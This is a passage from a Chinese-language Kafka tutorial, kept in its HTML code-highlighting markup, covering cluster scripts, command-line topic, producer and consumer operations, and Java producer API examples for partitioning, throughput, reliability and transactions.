class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> hadoop102 hadoop103 hadoop104</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">" --------停止 <span class="variable">$i</span> Kafka-------"</span></span><br><span class="line">    ssh <span class="variable">$i</span> <span class="string">"/opt/module/kafka/bin/kafka-server-stop.sh "</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加执行权限</span></span><br><span class="line">chmod +x kf.sh</span><br><span class="line"><span class="comment"># 启动集群命令</span></span><br><span class="line">kf.sh start</span><br><span class="line"><span class="comment"># 停止集群命令</span></span><br><span class="line">kf.sh stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：停止 Kafka 集群时，一定要等 Kafka 所有节点进程全部停止后再停止 Zookeeper集群。</span></span><br><span class="line"><span class="comment"># 因为 Zookeeper 集群当中记录着 Kafka 集群相关信息，Zookeeper 集群一旦先停止，Kafka 集群就没有办法再获取停止进程的信息，只能手动杀死 Kafka 进程了</span></span><br></pre></td></tr></table></figure><h2 id="3、Kafka-命令行操作">3、Kafka 命令行操作</h2><h3 id="3-1-Topic命令行操作">3.1 Topic命令行操作</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号，可以多个</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称</td></tr><tr><td>–create</td><td>创建主题</td></tr><tr><td>–delete</td><td>删除主题</td></tr><tr><td>–alter</td><td>修改主题</td></tr><tr><td>–list</td><td>查看所有主题</td></tr><tr><td>–describe</td><td>查看主题详细描述</td></tr><tr><td>–partitions &lt;Integer: # of partitions&gt;</td><td>设置分区数</td></tr><tr><td>–replication-factor&lt;Integer: replication factor&gt;</td><td>设置分区副本</td></tr><tr><td>–config &lt;String: name=value&gt;</td><td>更新系统默认的配置</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh</span><br><span class="line"><span class="comment"># 查看当前服务器中的所有 topic</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --list</span><br><span class="line"><span class="comment"># 创建 first topic</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --partitions 1 --replication-factor 3 --topic first</span><br><span class="line"><span class="comment"># 查看 first 主题的详情</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic first</span><br><span class="line"><span class="comment"># 修改分区数（注意：分区数只能增加，不能减少）</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --alter --topic first --partitions 3</span><br><span class="line"><span class="comment"># 再次查看 first 主题的详情</span></span><br><span class="line"><span class="comment"># 删除 topic</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --delete --topic first</span><br></pre></td></tr></table></figure><h3 id="3-2-生产者命令行操作">3.2 生产者命令行操作</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh</span><br><span class="line"><span class="comment"># 发送消息</span></span><br><span class="line">bin/kafka-console-producer.sh --bootstrap-server hadoop102:9092 --topic first</span><br></pre></td></tr></table></figure><h3 id="3-3-消费者命令行操作">3.3 消费者命令行操作</h3><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>–bootstrap-server &lt;String: server toconnect to&gt;</td><td>连接的 Kafka Broker 主机名称和端口号</td></tr><tr><td>–topic &lt;String: topic&gt;</td><td>操作的 topic 名称</td></tr><tr><td>–from-beginning</td><td>从头开始消费</td></tr><tr><td>–group &lt;String: consumer group id&gt;</td><td>指定消费者组名称</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh</span><br><span class="line"><span class="comment"># 消费 first 主题中的数据</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first</span><br><span class="line"><span class="comment"># 把主题中所有的数据都读取出来（包括历史数据）</span></span><br><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --from-beginning --topic first</span><br></pre></td></tr></table></figure><h1>二、Kafka核心概念详解</h1><blockquote><p>中文文档：<a href="https://kafka.apachecn.org/documentation.html" target="_blank" rel="noopener" title="https://kafka.apachecn.org/documentation.html">https://kafka.apachecn.org/documentation.html</a><br>kafka参数参考：<a href="https://blog.csdn.net/heiren_a/article/details/122232180" target="_blank" rel="noopener" title="Kafka配置参数详解">Kafka配置参数详解</a></p></blockquote><h2 id="1、Kafka-生产者">1、Kafka 生产者</h2><h3 id="1-1-生产者消息发送流程">1.1 生产者消息发送流程</h3><p>在消息发送的过程中，涉及到了<strong>两个线程——main 线程和 Sender 线程</strong>。在 main 线程中创建了一个<strong>双端队列 RecordAccumulator</strong>。main 线程将消息发送给 RecordAccumulator，Sender 线程不断从 RecordAccumulator 中拉取消息发送到 Kafka Broker</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335694.png" alt></p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>bootstrap.servers</td><td>生产者连接集群所需的 broker 地址清单。 例如 hadoop102:9092,hadoop103:9092,hadoop104:9092，可以设置 1 个或者多个，中间用逗号隔开。注意这里并非需要所有的 broker 地址，因为生产者从给定的 broker里查找到其他 broker 信息。</td></tr><tr><td>key.serializer 和 value.serializer</td><td>指定发送消息的 key 和 value 的序列化类型。一定要写全类名</td></tr><tr><td>buffer.memory</td><td>RecordAccumulator 缓冲区总大小，默认 32m。</td></tr><tr><td>batch.size</td><td>缓冲区一批数据最大值，默认 16k。适当增加该值，可以提高吞吐量，但是如果该值设置太大，会导致数据传输延迟增加。</td></tr><tr><td><a href="http://linger.ms" target="_blank" rel="noopener">linger.ms</a></td><td>如果数据迟迟未达到 batch.size，sender 等待 linger.time之后就会发送数据。单位 ms，默认值是 0ms，表示没有延迟。生产环境建议该值大小为 5-100ms 之间。</td></tr><tr><td>acks</td><td>0：生产者发送过来的数据，不需要等数据落盘应答。1：生产者发送过来的数据，Leader 收到数据后应答。-1（all）：生产者发送过来的数据，Leader+和 isr 队列里面的所有节点收齐数据后应答。默认值是-1，-1 和all 是等价的。</td></tr><tr><td>max.in.flight.requests.per.connection</td><td>允许最多没有返回 ack 的次数，默认为 5，开启幂等性要保证该值是 1-5 的数字</td></tr><tr><td>retries</td><td>当消息发送出现错误的时候，系统会重发消息。retries 表示重试次数。默认是 int 最大值，2147483647。如果设置了重试，还想保证消息的有序性，需要设置MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION=1否则在重试此失败消息的时候，其他的消息可能发送成功了。</td></tr><tr><td><a href="http://retry.backoff.ms" target="_blank" rel="noopener">retry.backoff.ms</a></td><td>两次重试之间的时间间隔，默认是 100ms</td></tr><tr><td>enable.idempotence</td><td>是否开启幂等性，默认 true，开启幂等性</td></tr><tr><td>compression.type</td><td>生产者发送的所有数据的压缩方式。默认是 none，也就是不压缩。支持压缩类型：none、gzip、snappy、lz4 和 zstd</td></tr></tbody></table><h3 id="1-2-Kafka操作-API">1.2 Kafka操作 API</h3><p>首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>普通异步发送</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接集群 bootstrap.servers</span></span><br><span class="line">    properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定对应的key和value的序列化类型 key.serializer</span></span><br><span class="line">    properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建kafka生产者对象</span></span><br><span class="line">    <span class="comment">// "" hello</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 发送数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>,<span class="string">"atguigu"</span>+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    kafkaProducer.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在 hadoop102 上开启 Kafka 消费者</span></span><br><span class="line"><span class="comment">// bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic first</span></span><br></pre></td></tr></table></figure><p><strong>带回调函数的异步发送</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">回调函数会在 producer 收到 ack 时调用，为异步调用，该方法有两个参数，分别是元</span></span><br><span class="line"><span class="comment">数据信息（RecordMetadata）和异常信息（Exception），如果 Exception 为 null，说明消息发</span></span><br><span class="line"><span class="comment">送成功，如果 Exception 不为 null，说明消息发送失败</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接集群 bootstrap.servers</span></span><br><span class="line">    properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定对应的key和value的序列化类型 key.serializer</span></span><br><span class="line"><span class="comment">//        properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,"org.apache.kafka.common.serialization.StringSerializer");</span></span><br><span class="line">    properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建kafka生产者对象</span></span><br><span class="line">    <span class="comment">// "" hello</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 发送数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i++) &#123;</span><br><span class="line">        kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>, <span class="string">"atguigu"</span> + i), <span class="keyword">new</span> Callback() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(RecordMetadata metadata, Exception exception)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (exception == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    System.out.println(<span class="string">"主题： "</span>+metadata.topic() + <span class="string">" 分区： "</span>+ metadata.partition());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    kafkaProducer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>同步发送 API</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未处理前会阻塞</span></span><br><span class="line">kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>,<span class="string">"atguigu"</span>+i)).get();</span><br></pre></td></tr></table></figure><h3 id="1-3-生产者分区">1.3 生产者分区</h3><p><strong>分区便于合理使用存储资源</strong>，每个Partition在一个Broker上存储，可以把海量的数据按照分区切割成一块一块数据存储在多台Broker上。合理控制分区的任务，可以实现负载均衡的效果。<strong>提高并行度</strong>，生产者可以以分区为单位发送数据；消费者可以以分区为单位进行消费数据</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335695.png" alt></p><p>自定义分区器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyPartitioner</span> <span class="keyword">implements</span> <span class="title">Partitioner</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(String topic, Object key, <span class="keyword">byte</span>[] keyBytes, Object value, <span class="keyword">byte</span>[] valueBytes, Cluster cluster)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数据 atguigu  hello</span></span><br><span class="line">        String msgValues = value.toString();</span><br><span class="line">        <span class="keyword">int</span> partition;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msgValues.contains(<span class="string">"atguigu"</span>))&#123;</span><br><span class="line">            partition = <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            partition = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> partition;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 关联自定义分区器,使用全类名</span></span><br><span class="line">properties.put(ProducerConfig.PARTITIONER_CLASS_CONFIG,<span class="string">"com.atguigu.kafka.producer.MyPartitioner"</span>);</span><br><span class="line">kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>,<span class="string">"hello"</span> + i), <span class="keyword">new</span> Callback() &#123;&#125;);</span><br></pre></td></tr></table></figure><h3 id="1-4-提高吞吐量">1.4 提高吞吐量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//批次大小和等待时间二者只要有一个满足就会发送</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置, 创建 kafka 生产者的配置对象</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接kafka集群,给 kafka 配置对象添加配置信息：bootstrap.servers</span></span><br><span class="line">    properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 缓冲区大小，默认 32M：buffer.memory</span></span><br><span class="line">    properties.put(ProducerConfig.BUFFER_MEMORY_CONFIG,<span class="number">33554432</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 批次大小,，默认 16K</span></span><br><span class="line">    properties.put(ProducerConfig.BATCH_SIZE_CONFIG,<span class="number">16384</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// linger.ms,等待时间默认 0</span></span><br><span class="line">    properties.put(ProducerConfig.LINGER_MS_CONFIG, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 压缩，默认 none，可配置值 gzip、snappy、lz4 和 zstd</span></span><br><span class="line">    properties.put(ProducerConfig.COMPRESSION_TYPE_CONFIG,<span class="string">"snappy"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建生产者</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2 发送数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>,<span class="string">"atguigu"</span>+i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3 关闭资源</span></span><br><span class="line">    kafkaProducer.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-5-数据可靠性">1.5 数据可靠性</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335696.png" alt></p><p><strong>当ack=-1时，Leader维护了一个动态的in-sync replica set（ISR），意为和Leader保持同步的Follower+Leader集合(leader：0，isr:0,1,2)</strong>。如果Follower长时间未向Leader发送通信请求或同步数据，则该Follower将被踢出ISR。该时间阈值由replica.lag.time.max.ms参数设定，<strong>默认30s</strong>。例如2超时，(leader:0, isr:0,1)。</p><p><strong>数据完全可靠条件 = ACK级别设置为-1 + 分区副本大于等于2 + ISR里应答的最小副本数量大于等于2</strong></p><p>可靠性总结：</p><ul><li>acks=0，生产者发送过来数据就不管了，可靠性差，效率高；</li><li>acks=1，生产者发送过来数据Leader应答，可靠性中等，效率中等；</li><li>acks=-1，生产者发送过来数据Leader和ISR队列里面所有Follwer应答，可靠性高，效率低；</li><li>在生产环境中，acks=0很少使用；acks=1，一般用于传输普通日志，允许丢个别数据；acks=-1，一般用于传输和钱相关的数据，对可靠性要求比较高的场景。但是acks=-1时，有重复消费的可能</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置 acks</span></span><br><span class="line"> properties.put(ProducerConfig.ACKS_CONFIG, <span class="string">"all"</span>);</span><br><span class="line"> <span class="comment">// 重试次数 retries，默认是 int 最大值，2147483647</span></span><br><span class="line"> properties.put(ProducerConfig.RETRIES_CONFIG, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-数据去重">1.6 数据去重</h3><ul><li>至少一次（At Least Once）= <strong>ACK级别设置为-1 + 分区副本大于等于2 + ISR里应答的最小副本数量大于等于2</strong></li><li>最多一次（At Most Once）= <strong>ACK级别设置为0</strong></li><li>总结：<ul><li>At Least Once可以保证数据不丢失，但是不能保证数据不重复；</li><li>At Most Once可以保证数据不重复，但是不能保证数据不丢失</li></ul></li><li>精确一次（Exactly Once）：对于一些非常重要的信息，比如和钱相关的数据，要求数据既不能重复也不丢失。Kafka 0.11版本以后，引入了一项重大特性：幂等性和事务。</li></ul><p><strong>幂等性</strong>就是指Producer不论向Broker发送多少次重复数据，Broker端都只会持久化一条(必须按照顺序进行落盘)，保证了不重复。重复数据的判断标准：具有**&lt;PID, Partition, SeqNumber&gt;<strong>相同主键的消息提交时，Broker只会持久化一条。其中</strong>PID是Kafka每次重启都会分配一个新的；Partition 表示分区号；Sequence Number是单调自增的**。所以幂等性只能保证的是在单分区单会话内不重复。开启幂等性：开启参数 <strong>enable.idempotence 默认为 true，false 关闭</strong></p><p>事务原理</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335697.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 共5个API</span></span><br><span class="line"><span class="comment">// 1 初始化事务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initTransactions</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 2 开启事务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beginTransaction</span><span class="params">()</span> <span class="keyword">throws</span> ProducerFencedException</span>;</span><br><span class="line"><span class="comment">// 3 在事务内提交已经消费的偏移量（主要用于消费者）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sendOffsetsToTransaction</span><span class="params">(Map&lt;TopicPartition, OffsetAndMetadata&gt; offsets,</span></span></span><br><span class="line"><span class="function"><span class="params"> String consumerGroupId)</span> <span class="keyword">throws</span> </span></span><br><span class="line"><span class="function">ProducerFencedException</span>;</span><br><span class="line"><span class="comment">// 4 提交事务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">commitTransaction</span><span class="params">()</span> <span class="keyword">throws</span> ProducerFencedException</span>;</span><br><span class="line"><span class="comment">// 5 放弃事务（类似于回滚事务的操作）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">abortTransaction</span><span class="params">()</span> <span class="keyword">throws</span> ProducerFencedException</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 举例</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接集群 bootstrap.servers</span></span><br><span class="line">    properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定对应的key和value的序列化类型 key.serializer</span></span><br><span class="line"><span class="comment">//        properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,"org.apache.kafka.common.serialization.StringSerializer");</span></span><br><span class="line">    properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, 